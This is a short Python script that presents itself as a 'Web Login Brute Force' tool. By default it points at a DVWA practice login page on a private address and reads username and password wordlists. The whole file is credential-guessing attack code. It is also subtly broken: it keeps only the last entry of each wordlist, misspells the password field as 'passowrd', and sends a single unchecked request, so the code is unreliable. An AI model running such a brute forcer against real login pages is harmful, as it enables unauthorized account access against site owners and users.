import requests
import argparse, pyfiglet

asciiBanner = pyfiglet.figlet_format("Web Login Brute Force")
print(asciiBanner)

parser = argparse.ArgumentParser(description="Simple Web Login brute force tool")
parser.add_argument('-u', '--url', help='Enter url to brute force', default='http://192.168.2.18/dvwa/login.php')
parser.add_argument('--user', help='Enter user wordlist', default='16_Web_login_Bruteforce/username.txt')
parser.add_argument('--password', help='Enter password wordlist', default='16_Web_login_Bruteforce/password.txt')
args = parser.parse_args()

url = args.url
passwordList = args.password
userList = args.user

# print (userList)
# print (passwordList)
def openWordlist():
    with open(passwordList) as f:
        for password in f.readlines(): 
            password = password.strip('\n')

    with open(userList) as f:
        for username in f.readlines(): 
            username = username.strip('\n')
    
    return (username, password)

(username, password) = openWordlist()

print(username)
data = {'username':username, 'passowrd':password, 'Login':'submit'}

sendDataUrl = requests.post(url,data=data)

